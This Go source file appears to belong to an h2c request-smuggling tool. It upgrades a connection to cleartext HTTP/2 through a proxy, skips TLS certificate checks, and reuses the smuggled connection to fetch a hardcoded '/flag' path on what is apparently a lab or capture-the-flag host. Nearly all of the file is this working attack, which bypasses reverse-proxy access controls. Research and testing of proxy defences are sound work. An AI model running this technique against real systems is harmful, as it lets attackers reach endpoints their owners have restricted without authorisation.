package h2csmuggler

import (
	"context"
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/minight/h2csmuggler/http2"
	log "github.com/sirupsen/logrus"

	"github.com/pkg/errors"
)

const CLIENT_PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

var (
	NotHTTPSUrlErr      = fmt.Errorf("URL provided is not https. Cannot create h2c connection")
	HTTP2UnsupportedErr = fmt.Errorf("Negotiated protocol does not contain h2")
)

func Request(desturl string) error {
	parsed, err := url.Parse(desturl)
	if err != nil {
		return err
	}

	transport := &http2.Transport{
		AllowHTTP: true,
	}

	dialer := &net.Dialer{
		Resolver: &net.Resolver{
			PreferGo: true,
			Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
				d := net.Dialer{
					Timeout: time.Millisecond * time.Duration(10000),
				}
				return d.DialContext(ctx, "udp", "1.1.1.1:53")
			},
		},
	}

	var conn net.Conn
	if parsed.Scheme == "https" {
		hostport := parsed.Host
		if parsed.Port() == "" {
			hostport = fmt.Sprintf("%s:%d", parsed.Host, 443)
		}

		tlsconn, err := tls.DialWithDialer(dialer, "tcp", hostport, &tls.Config{
			InsecureSkipVerify: true,
		})
		if err != nil {
			return errors.Wrap(err, "Failed to dial tls")
		}
		conn = tlsconn
	} else {
		conn, err = dialer.Dial("tcp", parsed.Host)
		if err != nil {
			return errors.Wrap(err, "Failed to dial tcp")
		}
	}

	defer conn.Close()

	req, err := http.NewRequest("GET", desturl, nil)
	if err != nil {
		return errors.Wrap(err, "Failed to create request")
	}
	req.Header.Add("Upgrade", "h2c")
	req.Header.Add("HTTP2-Settings", "AAMAAABkAARAAAAAAAIAAAAA")
	req.Header.Add("Connection", "Upgrade, HTTP2-Settings")

	// We will first pull our response off the wire
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	cc, res, err := transport.H2CUpgradeRequest(ctx, req, conn)
	if err != nil {
		return errors.Wrap(err, "Failed to create http2 conn")
	}
	defer cc.Close()

	defer res.Body.Close()

	data, err := ioutil.ReadAll(res.Body)
	if err != nil {
		return errors.Wrap(err, "Failed to read body")
	}
	log.WithFields(log.Fields{
		"path":   "/",
		"status": res.StatusCode,
		"proto":  res.Proto,
		"body":   string(data),
	}).Infof("success")

	path := "https://h2c.foxlabs.consulting/flag"
	req, err = http.NewRequest("GET", path, nil)
	if err != nil {
		return errors.Wrap(err, "Failed to create new request")
	}
	resp2, err := cc.RoundTrip(req)
	if err != nil {
		return errors.Wrap(err, "Failed to roundtrip")
	}
	defer resp2.Body.Close()

	data, err = ioutil.ReadAll(resp2.Body)
	if err != nil {
		return errors.Wrap(err, "Failed to read body")
	}
	log.WithFields(log.Fields{
		"path":   "/",
		"status": resp2.StatusCode,
		"proto":  resp2.Proto,
		"body":   string(data),
	}).Infof("success")
	return nil
}

func StringSliceContains(vs []string, target string) bool {
	for _, v := range vs {
		if strings.Contains(target, v) {
			return true
		}
	}

	return false
}
